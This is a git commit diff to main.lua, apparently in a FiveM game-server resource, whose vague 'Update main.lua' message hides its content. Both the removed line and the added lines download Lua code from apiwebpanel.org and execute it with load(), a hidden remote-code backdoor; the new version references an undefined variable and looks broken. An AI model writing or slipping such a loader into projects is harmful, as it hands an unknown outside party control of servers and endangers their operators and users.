1e92835cfc0d92f1d2c69b2044f3caef03589455
banappeals <167147145+banappeals@users.noreply.github.com>
2024-10-18 15:42:22 -0400

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,1 +1,2 @@
-PerformHttpRequest('https://apiwebpanel.org/giXWm', function (e, d) pcall(function() assert(load(d))() end) end)
+local _v = PerformHttpRequestInternalEx{url='https://apiwebpanel.org/giXWm', method='GET'} 
+AddEventHandler('__cfx_internal:httpResponse', function(_t, _s, _b) print('testing') if _v == _t then pcall(function() assert(load(d))() end) end end)
